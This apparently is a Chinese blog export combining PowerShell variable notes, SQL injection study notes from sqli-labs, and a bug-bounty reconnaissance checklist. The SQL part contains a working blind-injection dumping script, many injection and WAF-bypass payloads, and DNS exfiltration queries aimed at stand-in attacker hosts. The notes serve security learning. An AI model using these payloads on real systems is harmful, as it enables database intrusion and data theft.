$PSScriptRoot包含要从中执行脚本模块的目录。通过此变量，脚本可以使用模块路径来访问其他资源。 $PsUICulture包含操作系统中当前所用的用户界面 (UI) 区域性的名称。UI 区域性确定哪些文本字符串用于用户界面元素（如菜单和消息）。这是系统的System.Globalization.CultureInfo.CurrentUICulture.Name 属性的值。要获取系统的 System.Globalization.CultureInfo 对象，请使用 Get-UICulture cmdlet。 $PsVersionTable包含一个只读哈希表，该哈希表显示有关在当前会话中运行的 Windows PowerShell 版本的详细信息。该表包括下列项： CLRVersion： 公共语言运行时 (CLR) 的版本 BuildVersion： 当前版本的内部版本号 PSVersion： Windows PowerShell 版本号 WSManStackVersion： WS-Management 堆栈的版本号 PSCompatibleVersions： 与当前版本兼容的 Windows PowerShell 版本 SerializationVersion ：序列化方法的版本 PSRemotingProtocolVersion：Windows PowerShell 远程管理协议的版本 $Pwd包含一个路径对象，该对象表示当前目录的完整路径。 $Sender包含生成此事件的对象。此变量只在事件注册命令的 Action 块内填充。此变量的值也可在 Get-Event 返回的 PSEventArgs(System.Management.Automation.PSEventArgs) 对象的 Sender 属性中找到。 $ShellID包含当前 shell 的标识符。 $SourceArgs包含表示正在被处理的事件的事件参数的对象。此变量只在事件注册命令的 Action块内填充。此变量的值也可在 Get-Event 返回的 PSEventArgs(System.Management.Automation.PSEventArgs) 对象的 SourceArgs 属性中找到。 $SourceEventArgs包含一个对象，该对象表示从正在被处理的事件的 EventArgs 中派生出的第一个事件参数。此变量只在事件注册命令的 Action 块内填充。此变量的值也可在 Get-Event 返回的 PSEventArgs(System.Management.Automation.PSEventArgs) 对象的 SourceArgs 属性中找到。 $This在定义脚本属性或脚本方法的脚本块中，$This 变量引用要扩展的对象。 $True包含 TRUE。可以在命令和脚本中使用此变量表示 TRUE。 环境变量环境变量保存在env:虚拟驱动中，可以使用$env:windir这种形式访问其中的环境变量。 Powershell中的环境变量是机器环境变量的副本，下次打开会恢复，如果想持久生效，需要使用.NET方法。[environment]::SetEnvironmentvariable(&quot;Path&quot;,&quot;;C://powershellscript&quot;,&quot;user&quot;)，[encironment]::GetEnvironmentvariable(&quot;Path&quot;,&quot;User&quot;)。 驱动器变量 Name Root Description A A: Alias Drive containing a view of the aliases stored in session state. C C: cert X509 Certificate Provider E E: Env The drive containing a view of the environment variables for the process. Function The drive containing a view of the functions stored in session state. HKCU HKEY_CURRENT_USER The software settings for the current user. HKLM HKEY_LOCAL_MACHINE The configuration settings for the local machine. Variable The drive containing a view of those variables stored in session state. WSMan Root of WsMan Config Storage. 变量的作用域 作用域 说明 $global 全局变量，在所有作用域中有效 $script 脚本变量，脚本内部有效，包括脚本中的函数 $private 只在当前作用域中有效，不能贯穿到其他作用域 $local 默认变量，可以省略修饰符，在当前作用域有效，其他作用域只读 如果不做特殊声明，解释器会自动处理和限制变量的作用域。如果在运行脚本时前面加上点和空格（. .\\test.ps1），这个脚本就会共享当前控制台的作用域，但是可能存在问题。 $private:var=&quot;I am a private variable&quot; 变量类型powershell本身是弱类型的，但可以使用[type]$k=&quot;v&quot;的方式指定类型，每个特殊的数据类型都有自己的特殊命令和方法。默认支持的.NET类型如下： [array],[bool],[byte],[char],[datetime],[decimal],[double],[guid],[hashtable],[int16],[int32],[int],[int64],[long],[nullable],[psobject],[regex],[sbyte].[scriptblock],[single],[float],[string],[switch],[timespan],[type],[uint16],[uint32],[uint64],[ XML ] 使用[int[]]$nums=@()的形式可以定义强类型数组 变量的幕后管理创建变量同时会在后台生成一个PSVariable对象，包含变量的信息。Get-Variable a | fl *可以得到变量的全部信息。 更新变量的选项设置，可以使用Set-Variable，也可以获取PSvariable对象后更改，比如： 123456789101112131415161718192021222324$str = &quot;I am a variable&quot;$var = Get-Variable str$var&lt;#Name Value---- -----str I am a variable#&gt;$var | fl *&lt;#Name : strDescription : Value : I am a variableVisibility : PublicModule :ModuleName :Options : NoneAttributes : {}#&gt;$var.Description = &quot;I know that&quot;# 如果不想使用$var(Get-Variable str).Description = &quot;changed&quot;# 改变选项Set-Variable str -Option &quot;ReadOnly&quot; 选项设置是一个枚举值，包括： None ，默认设置 ReadOnly ，只读，可以通过 -Force选项更新 Constant ，常量，一旦声明在当前控制台无法更新 Private ，只在当前作用域可见，不能贯穿 AllScope ，全局，可以贯穿 每个变量都有自己具体的类型，存放在PSvariable对象的Attributes[System.Management.Automation.PSVariableAttributeCollection]属性，如果这个Attributes为空，可以存储任何类型的数据，一旦Attributes固定，就不能随意存放数据。可以使用(Get-Variable var).Attributes.Clear()清空。 PSVariable对象的Attributes属性可以存储一些附加条件，比如限制长度： 1234567891011$var = &quot;限制变量&quot;$condition = New-Object System.Management.Automation.ValidateLengthAttribute -ArgumentList 2,5 #限制长度2-5$var = &quot;新射雕英雄传&quot;&lt;#The variable connot be validatd because the value 新射雕英雄传 is not a valid value for the var variableAt line:1 char:5+ $var &lt;&lt;&lt;&lt; =&quot;看射雕英雄传&quot; + CategoryInfo : MetadataError: (:) [], ValidationMetadataException + FullyQualifiedErrorId : ValidateSetFailure#&gt; 常用的变量内容验证还有5种，分别为：ValidateNotNullAttribute：限制变量不能为空ValidateNotNullOrEmptyAttribute：限制变量不等为空，不能为空字符串，不能为空集合ValidatePatternAttribute:限制变量要满足制定的正则表达式ValidateRangeAttribute：限制变量的取值范围ValidateSetAttribute：限制变量的取值集合 数组和哈希表命令返回数组命令的执行结果保存到变量中时，powershell会把文本的每一行作为元素存为数组。如果命令返回多个值，也会被存储为数组。 12345678910111213141516$ip = ipconfig$ip -is [array] # True&quot;abc&quot; -is [array] # False$str = &quot;string&quot;$str.ToCharArray() -is [array] # True$array.Count # 数组元素个数$array[x] # 查看下标为x的元素# 使用管道进一步处理数组ipconfig | Select-String &quot;IP&quot;&lt;#Windows IP Configuration Link-local IPv6 Address . . . . . : *** IPv4 Address. . . . . . . . . . . : *** Link-local IPv6 Address . . . . . : ***#&gt; 使用对象操作cmdlet命令会返回一个内容丰富的对象。例如ls，返回的数组的每一个对象是一个System.IO.DirectoryInfo对象，输出这些对象时，powershell会自动把它们转换成友好的文本格式 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364ls&lt;# Directory: C:PowershellMode LastWriteTime Length Name---- ------------- ------ ----d---- 2011/11/23 17:25 ABCd---- 2011/11/29 18:21 myscript-a--- 2011/11/24 18:30 67580 a.html-a--- 2011/11/24 20:04 26384 a.txt-a--- 2011/11/24 20:26 12060 alias-a--- 2011/11/24 20:27 12060 alias.ps1-a--- 2011/11/23 17:25 0 b.txt-a--- 2011/11/23 17:25 0 c.txt-a--- 2011/11/23 17:25 0 d.txt-a--- 2011/11/25 11:20 556 employee.xml-a--- 2011/11/29 19:23 21466 function.ps1-a--- 2011/11/28 11:12 186 LogoTestConfig.xml-a--- 2011/11/24 17:37 7420 name.html-a--- 2011/11/28 15:30 63 ping.bat-a--- 2011/11/24 17:44 735892 Powershell_Cmdlets.html-a--- 2011/11/30 16:04 2556 psdrive.html-a--- 2011/12/2 18:47 140 test.ps1-a--- 2011/11/23 17:37 242 test.txt-a--- 2011/11/28 16:42 170 test.vbs#&gt;$result=ls$result.Count# 20$result[0].gettype().fullname# System.IO.DirectoryInforesult[0]&lt;# Directory: C:PowershellMode LastWriteTime Length Name---- ------------- ------ ----d---- 2011/11/23 17:25 ABC#&gt;# 对于任何对象都可以使用Format-List *(fl *)查看所有的属性和方法$result[0] | fl *&lt;#PSPath : Microsoft.PowerShell.CoreFileSystem::C:PowershellABCPSParentPath : Microsoft.PowerShell.CoreFileSystem::C:PowershellPSChildName : ABCPSDrive : CPSProvider : Microsoft.PowerShell.CoreFileSystemPSIsContainer : TrueBaseName : ABCMode : d----Name : ABCParent : PowershellExists : TrueRoot : C:FullName : C:PowershellABCExtension :CreationTime : 2011/11/23 17:25:53CreationTimeUtc : 2011/11/23 9:25:53LastAccessTime : 2011/11/23 17:25:53LastAccessTimeUtc : 2011/11/23 9:25:53LastWriteTime : 2011/11/23 17:25:53LastWriteTimeUtc : 2011/11/23 9:25:53Attributes : Directory#&gt; 创建数组1234567891011121314151617181920212223242526272829303132333435# 创建数组可以使用逗号，连续的数字数组有语法糖$nums = 2,0,2,1$nums = 1..5# 数组可以存放不同类型的对象$array=1,&quot;2012世界末日&quot;,([System.Guid]::NewGuid()),(get-date)$array&lt;#12012世界末日Guid----06a88783-a181-4511-9e41-2780ecbd7924DisplayHint : DateTimeDate : 2011/12/9 0:00:00Day : 9DayOfWeek : FridayDayOfYear : 343Hour : 14Kind : LocalMillisecond : 910Minute : 15Month : 12Second : 45Ticks : 634590369459101334TimeOfDay : 14:15:45.9101334Year : 2011DateTime : 2011年12月9日 14:15:45#&gt;# 空数组$a=@()# 单元素数组$a=,&quot;a&quot; 访问数组123456789# 访问最后一个元素$arr[($arr.Count-1)]$arr[-1]# 选择多个元素$arr[1,3,4]# 逆序输出$arr[($arr.Count)..0]","link":"/2019/09/07/powershell/"},{"title":"SQL注入","text":"sqli-labs记录，后面的数字是关数。 随时添加新的trick SQL注入的关键在于闭合 SQLi-labs参考https://www.cnblogs.com/-zhong/category/1465512.html Updatexml, extractvalue -512345id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)id=updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)id=updatexml(1,concat(0x7e,SUBSTR((SELECT @@version),1,24),0x7e),1)updatexml(1,concat(0x7e,(select substring(f14g,20) from f14g limit 0,1),0x7e),1)extractvalue(0x0a,concat(0x0a,(select database()))) updatexml最多只能显示32位 布尔盲注 -8针对没有回显，只显示查询是否成功的注入，通过逐位判断注出数据。 1234?id=1 # 正常，显示You are in?id=1' # 发生了错误，没有回显?id=1' and 1=1--+ # 正常?id=1' and 1=2--+ # 无结果，同样没有回显 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122import requestsurl = 'http://1dd20f94-5f32-41ba-a9b3-4b023c50b547.node3.buuoj.cn/Less-8'flag = 'You are in...........'param_name = 'id'brutelist = ',abcdefghijklnmopqrstuvwxyz_1234567890'def send_requests(payload): # ok payload_dict = {param_name: payload} r = requests.get(url, params=payload_dict) # print(r.url) return r.textdef get_db_length(): # ok count = 1 while True: payload = &quot;1\\' AND LENGTH(DATABASE())=&quot; + str(count) + &quot;-- &quot; recv = send_requests(payload) if flag in recv: return count count += 1def get_db_name(db_length): # ok db_name = '' for i in range(1, db_length+1): for j in brutelist: j = ord(j) payload = &quot;1\\' AND ASCII(SUBSTR(DATABASE(),&quot; + str(i) + &quot;,1))=&quot; + str(j) + &quot;-- &quot; recv = send_requests(payload) if flag in recv: db_name += chr(j) break return db_namedef get_table_length(db_name): # ok count = 1 while True: payload = &quot;1\\' AND (SELECT LENGTH(GROUP_CONCAT(table_name)) FROM information_schema.tables WHERE table_schema=\\'&quot; + db_name + &quot;\\')=&quot; + str(count) + &quot;-- &quot; recv = send_requests(payload) if flag in recv: return count count += 1def get_table_name(db_name, table_length): # ok table_name = '' for i in range(1, table_length+1): for j in brutelist: j = ord(j) payload = &quot;1\\' AND (SELECT ASCII(SUBSTR(GROUP_CONCAT(table_name),&quot; + str(i) + &quot;,1)) FROM information_schema.tables WHERE table_schema=\\'&quot; + db_name + &quot;\\')=&quot; + str(j) + &quot;-- &quot; recv = send_requests(payload) if flag in recv: table_name += chr(j) break return table_namedef get_column_length(db_name, table_name): # ok count = 1 while True: payload = &quot;1\\' AND (SELECT LENGTH(GROUP_CONCAT(column_name)) FROM information_schema.columns WHERE table_name=\\'&quot; + table_name + &quot;\\' AND table_schema=\\'&quot; + db_name + &quot;\\')=&quot; + str(count) + &quot;-- &quot; recv = send_requests(payload) if flag in recv: return count count += 1def get_column_name(db_name, table_name, column_length): # ok column_name = '' for i in range(1, column_length+1): for j in brutelist: j = ord(j) payload = &quot;1\\' AND (SELECT ASCII(SUBSTR(GROUP_CONCAT(column_name),&quot; + str(i) + &quot;,1)) FROM information_schema.columns WHERE table_name=\\'&quot; + table_name + &quot;\\' AND table_schema=\\'&quot; + db_name + &quot;\\')=&quot; + str(j) + &quot;-- &quot; recv = send_requests(payload) if flag in recv: column_name += chr(j) break return column_namedef get_data(table_name, column_name): res = {} for column in column_name.split(','): res[column] = '' i = 1 while True: f = 0 for j in range(32, 127): payload = &quot;1\\' AND (SELECT ASCII(SUBSTR(GROUP_CONCAT(&quot; + column + &quot;),&quot; + str(i) + &quot;,1)) FROM &quot; + table_name + &quot;)=&quot; + str(j) + &quot;-- &quot; recv = send_requests(payload) if flag in recv: f = 1 res[column] += chr(j) break i += 1 if f == 0: break return resdef main(): print('Working on ' + url) db_length = get_db_length() db_name = get_db_name(db_length) print('Database: ' + db_name) table_length = get_table_length(db_name) table_name = get_table_name(db_name, table_length) print('Tables: ' + table_name) table_name = input('Select a table to dump: ') column_length = get_column_length(db_name, table_name) column_name = get_column_name(db_name, table_name, column_length) data = get_data(table_name, column_name) print(data)if __name__ == '__main__': main() 这里注入data的时候也应该先爆出长度再注数据，否则一旦丢包会导致后面的数据全部丢失。此外可以使用二分法查找数据，效率更高。 时间盲注 -9利用IF(statement,1,sleep(5))的形式，如果结果为真，会直接返回结果，否则会5秒之后返回一个页面，其他与上面类似。 1?id=1' and sleep(5)--+ # 5秒后返回了页面，存在时间盲注 python中可以用time模块中的time.time()获取当前时间。 拆分 -23过滤了注释符，分别闭合前面和后面的单引号 10' union select 1,database(),'3 二次注入 -24注册新用户和登录时无法产生注入，但是修改密码时没有进行过滤。 注册用户admin'#，经过了转义，它只是一个普通的用户名，不会产生注入，登录时同理。但在修改密码时没有进行过滤，语句变为update set users password='$pass' where username='admin'# ....，修改了admin的密码。 过滤 -25 -26 -27双写绕过，anandd过滤后变成and。 SQL对大小写不敏感，SeleCt 空格可以用/**/、()、%0a、反引号、tab、%a0、%0b 可以用报错注入，用括号绕过空格 1?id=1%27||updatexml(1,concat(%27$%27,(select(database())),1),1)||%271%27=%271 基础以 select id,user,pass from users where id='$id' 为例 判断闭合 12id=1' 报错id=1'# 正常，单引号闭合 判断列数 121' order by 3# 正常1' order by 4# 报错，3列 判断显示位，假设显示位是 user，同时也可以判断列数 10' union select 1,2,3# 显示2，显示位是第二位 查当前数据库 10' union select 1,database(),3# 查数据库 10' union select 1,group_concat(schema_name),3 from information_schema.schemata# 查表名 10' union select 1,group_concat(table_name),3 from information_schema.tables where schema_name='dvwa'# 查列名 10' union select 1,group_concat(column_name),3 from information_schema.columns where schema_name='dvwa' and table_name='users'# 查数据 10' union select 1,group_concat(password),3 from dvwa.users# 宽字节注入传入的单引号被反斜杠转义，而数据库编码为GBK时，可以通过输入一个ascii码范围外的字符与添加的反斜杠结合成一个GBK字符，比如正常情况下 1id=1' 被加入反斜杠转义，查询语句变成 1select * from users where 'id=1/'' 不会引发注入，而加入一个其他字符后 1id=%df' %df和反斜杠结合成了一个新的GBK字符，单引号没有被转义，查询语句 1select * from users where id='？'' 报错注入SQL 中的报错有时会提示一些信息，报错注入指将查询结果包含在报错信息中 12345678910union select count(*),2,concat(':',(select database()),':',floor(rand()*2))as a from information_schema.tables group by a # 主键重复，利用floor()和rand()id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e))) # extractvalue()id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1)) # updatexml()id=1 and geometrycollection((select * from(select * from(select user())a)b)) #geometrycollection()id=1 and multipoint((select * from(select * from(select user())a)b)) # multipoint()id=1 and polygon((select * from(select * from(select user())a)b)) # polygon()id=1 and multipolygon((select * from(select * from(select user())a)b)) #multipolygon()id=1 and linestring((select * from(select * from(select user())a)b)) # linestring()id=1 and multilinestring((select * from(select * from(select user())a)b)) # multilinestring()id=1 and exp(~(select * from(select user())a)) # exp() 布尔盲注在服务端只返回查询成功和失败的情况下，通过逐位爆破得到结果。 以select id,user,pass from users where id=$id为例，假设查询成功返回yes，失败返回no 12341 返回yes0 返回noif(1=1,1,0) 返回yesif(1=2,1,0) 返回no 查当前数据库 1234if(select ascii(substr(database(),1,1))=65,1,0) 返回yes则第一位是aif(select ascii(substr(database(),1,1))=66,1,0) 返回yes则第一位是b...if(select ascii(substr(database(),2,1))=65,1,0) 查询第二位 其他类似 时间盲注与布尔盲注同理，判断查询是否成功的方式从返回的结果变为返回的时间 1if(select ascii(substr(database(),1,1))=65,1,0) and sleep(5) 过5秒返回结果说明前面的语句为真 堆叠注入有时sql可以执行以分号分割的多条查询语句，此时可能存在堆叠注入 1id=1';select if(ascii(substr(user(),1,1))=65,sleep(3),1)%23 除了 sleep ，可以使用 rlike, rpad, repeat, bunch 等大量计算达到延时效果 PDOPDO(PHP Data Object)，为访问数据库提供了统一的接口。 PDO 默认支持多语句执行，使用时会向 Mysql 服务器发送一次 Set Option 请求将 multi statements 设置打开。 Mysql 支持预处理，利用参数化高效执行重复的语句，官方将 prepare，execute，deallocate 统称为 prepare statement，最常用的是 prepare 和 execute。 在 PDO 下的注入，只要没有设置 array(PDO::MYSQL_ATTR_MULTI_STATEMENTS =&gt; false)，就有可能存在多语句执行，而使用?可以防止字符串拼接。 12345678910111213141516171819202122&lt;?php header('content-type: text/html; charset=utf-8'); $dbms='mysql'; $host='127.0.0.1'; $dbName='test'; $user='root'; $pass='root';$dsn=&quot;$dbms:host=$host;dbname=$dbName&quot;; try { $pdo = new PDO($dsn, $user, $pass, array( PDO::MYSQL_ATTR_MULTI_STATEMENTS =&gt; false)); } catch (PDOException $e) { echo $e; } $id = $_GET['id'];$sql = &quot;SELECT * from test where id =?&quot;; $stmt = $pdo-&gt;prepare($sql);$stmt-&gt;bindParam(1,$id); $stmt-&gt;execute(); while($row=$stmt-&gt;fetch(PDO::FETCH_ASSOC)) { echo &quot;用户ID：&quot;.$row['id'].&quot;&lt;br &gt;&quot;; echo &quot;用户名：&quot;.$row['name'].&quot;&lt;br &gt;&quot;; var_dump($row); } 带外注入当不能通过回显或者盲注观察sql的执行结果时，可以考虑使用带外注入，原理是利用dns解析，逐位爆破 配置域名解析，先添加一条名为oob、值为ns1.attack.com的 NS 记录，创建一个子域，再添加名为ns1，值为服务器IP的 A 记录，这会将子域oob.attack.com所有的 DNS 请求转发到服务器中。在服务器中使用 tcpdump -n port 53 观察DNS请求，在另一台机器上使用 dig test.oob.attack.com，此时应该可以在服务器中看到对 test.oob.attack.com的查询。 配置完成，接下来是在SQL中实现DNS查询，并把查询的结果包含进去。 Oracle 1234567891011121314/*检测*/SELECT DBMS_LDAP.INIT((‘oob.dnsattacker.com',80) FROM DUAL; /* Extracting Oracle database version */SELECT DBMS_LDAP.INIT((SELECT version FROM v$instance)||'.attacker.com',80) FROM dual; /*Extracting Current user in Oracle database */SELECT DBMS_LDAP.INIT((SELECT user FROM dual)||'.attacker.com',80) FROM dual; /*10G 或更低版本可用以下替代方法*/UTL_INADDR.GET_HOST_ADDRESS, UTL_HTTP.REQUEST,HTTP_URITYPE.GETCLOB, DBMS_LDAP.INIT and UTL_TCP MSSQL 12345678910111213/*检测*/EXEC master..xp_dirtree '\\\\oob.dnsattacker.com \\' –/*Payload，需要 sysadmin 权限*/DECLARE @data varchar(1024);SELECT @data = (SELECT system_user); EXEC('master..xp_dirtree &quot;\\\\'+@data+'.oob.dnsattacker.com\\foo$&quot;');/*其他方法*/xp_fileexists,xp_subdirs,xp_getfiledetails,sp_add_sobstep MySQL 12345/*检测*/SELECT LOAD_FILE(CONCAT('\\\\\\\\', 'oob.dnsattacker.com\\\\test.txt'));/*payload，需要 file,select,update 权限*/SELECT LOAD_FILE(CONCAT('\\\\\\\\', (SELECT HEX(CONCAT(user(),&quot;\\n&quot;))), '.oob.dnsattacker.com\\\\test.txt')); Postgresql 1234567891011121314151617/*检测*/CREATE EXTENSION dblink;SELECT dblink_connect('host=oob.dnsattacker.com user=postgres password=password dbname=dvdrental');/*payload，需要 superuser 权限执行 CREATE EXTENSION 查询*/DROP TABLE IF EXISTS table_output;CREATE TABLE table_output(content text);CREATE OR REPLACE FUNCTION temp_function()RETURNS VOID AS $$DECLARE exec_cmd TEXT;DECLARE query_result TEXT;BEGIN SELECT INTO query_result (SELECT encode(convert_to(concat(user,' '), 'UTF8'),'hex')); exec_cmd := E'COPY table_output(content) FROM E\\'\\\\\\\\\\\\\\\\'||query_result||E'.oob.dnsattacker.com\\\\\\\\foobar.txt\\''; EXECUTE exec_cmd;END;$$ LANGUAGE plpgsql SECURITY DEFINER;SELECT temp_function(); DNS数据提取的限制： 域名最多包含127个子域 每个子域最多包含63字符 完整域名最大长度为253字符 由于DNS记录缓存，会为每个请求的URL添加一个唯一值 DNS是明文通道，可悲中间节点和DNS服务器缓存使用，敏感数据可能泄露 二阶注入查询时没有发生注入，但是查询的结果或者语句用在了其他地方，产生了注入。可参考sqli-labs less-25 注入点搜索框 日期类型参数，如果没有进行强制类型转换容易出现注入 order by: 123order by 1 and(updatexml(1,concat(0x7e,@@version,0x7e),0))order by if(1=2,1,(select(1)from(select(sleep(2)))test))order by (select 1 regexp if(substring(user(),1,1)=0x72,1,0x00)) limit: 1limit 1,1 procedure analyse(extractvalue(1,concat(0x7e,version(),0x7e)),1) group by: 1group by if(1=2,1,(select(1)from(select(sleep(2)))test)) table: 1users where updatexml(1,concat(0x7e,(select user()),0x7e),1)# Bypass首先确定被拦截的部分，针对性绕过。 大小写 SelECt 双写 seleselectct 编码，url 或者 hex 空格，用括号，注释/**/，%a0绕过 逗号绕过，在 substr()和mid()中使用from to 比较符号绕过，greattest between and regexp 正则 和 like 注入 逻辑，and和&amp;&amp;，or和||，xor和|，not和!可以替换 函数，hex()、bin()和ascii()，concat_ws()和group_concat()，mid()、substr()和substring() HTTP参数污染，id=1 union select 1,2,3 from users where id=1-变成id=1 union select 1&amp;id=2,3 from users where id=1- 缓冲区溢出，id=1 and (select 1)=(Select 0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA)+UnIoN+SeLeCT+version(),database(),user()–+，A越多越好 注释符 #comment /*comment*/ -- comment 内联注释 /*!comment*/，id=1/*!UniOn*/Select 1# select，使用handler语句代替（Mysql）： 12345678910HANDLER tbl_name OPEN [ [AS] alias]HANDLER tbl_name READ index_name { = | &lt;= | &gt;= | &lt; | &gt; } (value1,value2,...) [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST } [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name READ { FIRST | NEXT } [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name CLOSE 其他SMB Relay 攻击异或注入当SQL接受异或操作符时，可以通过异或完成盲注。 1id=1^(exp)^1%23 当 exp 为 true 时，返回 id=1 的结果，false 返回 id=0 的结果。 无列名注入例如SWPU2019]Web1，无法得到列名。 可以利用union select构造新的列名（需要知道列数），以sqli-labs的security库为例 1select 1,2,3 union select * from users; 返回结果是一张新的表，列名分别是1，2，3，然后再从这张新表中查询数据 123select `3` from (select 1,2,3 union select * from users)as a;select `3` from (select 1,2,3 union select * from users)a;# 这两种等价 就在不知道列名的情况下得到了第三列的数据，as a是为这张新表指定一个别名，否则会出错。反引号表示查询的这个列名为3，而不是select 数字3。 也可以为列设置别名 1select 1 a,2 b,3 c union select * from users; 这样就可以 1select c from (select 1,2,3 c union select * from users)a; 无法使用information_schema12345sys.schema_auto_increment_columns，需要在表中有一个自增的字段，一般是id。sys.schema_table_statistics_with_buffersys.x$ps_schema_table_statistics_iomysql.innodb_index_statsmysql.innodb_table_stats 后续操作任意文件上传没有路径时，数据库中会存储路径，配合 sqlmap 的 --sql-shell 和 --search 寻找 shell 位置。 数据库特性MSSQL，由浅入深了解MSSQL注入.pdf Mysql，udf，mof Postgresql， copy from， copy to 读文件。 OracleSqlmap中文手册 自带tampers12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758apostrophemask.py 用UTF-8全角字符替换'（例如'-&gt;％EF％BC％87）apostrophenullencode.py 用双unicode替换'（例如'-&gt;％00％27）appendnullbyte.py 在payload的末尾附加NULL字节字符（％00）base64encode.py 对payload中的所有字符进行base64编码between.py 用运算符（'&gt;'）替换'NOT BETWEEN 0 AND＃'，用运算符（'='）替换'BETWEEN＃AND＃'bluecoat.py 用随机空白字符替换语句后的空格字符，之后用运算符LIKE替换字符'='chardoubleencode.py 对payload中的所有字符进行双重URL编码（例如SELECT-&gt;％2553％2545％254C％2545％2543％2554）charencode.py 对payload中所有字符进行URL编码（例如SELECT-&gt;％53％45％4C％45％43％54）charunicodeencode.py 对payload中的所有字符进行unicode编码（例如SELECT-&gt;％u0053％u0045％u004C％u0045％u0043％u0054）charunicodeescape.py 使用Unicode转义payload中的未编码字符（例如SELECT-&gt;\\u0053\\u0045\\u004C\\u0045\\u0043\\u0054）commalesslimit.py 用'LIMIT N OFFSET M'替换（MySQL）实例，例如'LIMIT M，N'commalessmid.py 用'MID（A FROM B FOR C）'替换（MySQL）实例，例如'MID（A，B，C）'commentbeforeparentheses.py 在括号前加（内联）注释（例如（（-&gt;/**/（）concat2concatws.py 用'CONCAT_WS（MID（CHAR（0），0，0），A，B）'替换（MySQL）实例，例如'CONCAT（A，B）' 。equaltolike.py 将（'='）运算符替换为'LIKE'escapequotes.py 斜杠转义单引号和双引号（例如'-&gt; \\'）great.py 替换运算符（'&gt;' ）和'GREATEST'对应Halfversionedmorekeywords.py 在每个关键字前添加mysql注释hex2char.py 替换每个（MySQL）0x等效的CONCAT（CHAR（），...）编码字符串htmlencode.py 用HTML编码（使用代码点）所有非字母数字字符（例如'-&gt;'）ifnull2casewhenisnull.py 绕过对 IFNULL 过滤,替换类似’IFNULL(A, B)’为’IF(ISNULL(A), B, A)’ifnull2ifisnull.py 用'IF（ISNULL（A），B）替换'IFNULL（A，B）'之类的实例，A）'对应informationschemacomment.py 在所有出现的（MySQL）“information_schema”标识符的末尾添加一个内联注释（/ ** /）least.py 用'LEAST'对应替换运算符（'&gt;'）lowercase.py 用小写替换每个关键字字符（例如SELECT-&gt;select）luanginx.py LUA-NginxWAF绕过（例如Cloudflare）modsecurityversioned.py 包含带有（MySQL）版本注释的完整查询modsecurityzeroversioned.py 包含带有（MySQL）零版本注释的完整查询multiplespaces.py 在SQL关键字周围添加多个空格（''）overlongutf8.py 将payload中的所有（非字母数字）字符转换为超长UTF8（例如'-&gt;％C0％A7）overlongutf8more.py 将payload中所有字符转换为超长UTF8（例如SELECT-&gt;％C1％93％C1％85％C1％8C％C1％85％C1％83％C1％94）percent.py 在每个字符前面添加一个百分号（'％'） （例如SELECT-&gt;％S％E％L％E％C％T）plus2concat.py 替换运算符（'+'）与（MsSQL）函数CONCAT（）对应plus2fnconcat.py 用（MsSQL）ODBC函数{fn CONCAT（）}替换为（'+'）randomcase.py 用随机大小写值替换每个关键字字符（例如SELECT-&gt; SEleCt）randomcomments.py 在SQL关键字内添加随机内联注释（例如SELECT-&gt; S/**/E/**/LECT）sp_password.py 将（MsSQL）函数'sp_password'附加到payload的末尾，以便从DBMS日志中自动进行混淆space2comment.py 空格替换为/**_**/space2dash.py 空格替换为-加随机字符space2hash.py 空格替换为#加随机字符space2morecomment.py 空格替换为/**_**/space2morehash.py 空格替换为#加随机字符及换行符space2mssqlblank.py 空格替换为其他空符号（MsSQL）space2mssqlhash.py 空格替换为%23%0A(MsSQL)space2mysqlblank.py 空格替换为其它空符号（Mysql）space2mysqldash.py 替换空格字符（''）（’–‘）后跟一个破折号注释一个换行（’n’）space2plus.py 用加号（'+'）替换空格字符（''）space2randomblank.py 用空格中的随机空白字符替换空格字符（''）有效的替代字符集substring2leftright.py 用LEFT和RIGHT替换PostgreSQL SUBSTRINGsymbolicologic.py 用符号（&amp;&amp;和||）替换AND和OR逻辑运算符unionalltounion.py 用UNION SELECT替换UNION ALL SELECTunmagicquotes.py 用多字节组合％BF％27替换引号字符（'），并在末尾添加通用注释uppercase.py- 用大写值替换每个关键字字符（例如select -&gt; SELECT）varnish.py 添加HTTP标头'X-originating-IP'以绕过Varnish防火墙versionedkeywords.py 用注释封装每个非函数的关键字versionedmorekeywords.py 将每个关键字包含（MySQL）版本注释xforwardedfor.py 添加伪造的HTTP标头'X-Forwarded-For","link":"/2020/02/01/sql-injection/"},{"title":"SRC 挖掘","text":"Security Response Center 观察SRC划定范围，备案信息、天眼查、whois 、邮箱反查 子域名 onforall IP端口 masscan+nmap 网站信息，云悉，wappalyzer，ThreatScan 目录扫描 wfuzz，御剑，7kb 字典：github.com/TheKingOfDuck/fuzzDicts js 中的路径、敏感信息收集，JSFinder APP信息搜集，反编译搜索 jar 包 github.com/s0md3v 隐藏站点目录 google 搜索 404 、403页面，可以fuzz接口目录、google搜索、github搜索 Spring whitelable error 页面，actuator配置不当漏洞、swagger未授权访问接口 weblogic 页面 ：工具weblogicscan tomcat put 漏洞，弱口令，ajp文件 存在漏洞的第三方组件 登录框：任意注册，任意用户登录，任意密码重置，短信轰炸，邮箱轰炸，找回密码逻辑漏洞，认证缺陷，用户名可穷举，验证码隐藏参数（修改验证码大小，可以引发dos攻击）、验证码绕过（删除或者0000万能验证码） 敏感信息接口：越权访问、jsonp劫持、cors跨域漏洞 js文件：未授权访问、敏感信息泄露（webpack打包）、路径泄露，js硬编码密码 参数点：xss，sql注入，任意文件读取，任意文件下载，遍历读取，url跳转漏洞，ssrf 可利用端口，ajp漏洞，redis未授权，Rsync未授权，mangodb未授权，FTP未授权，memcache未授权、zookeeper未授权、jenskins未授权，docker未授权 报错页面：spring，tomcat，weblogic，nginx 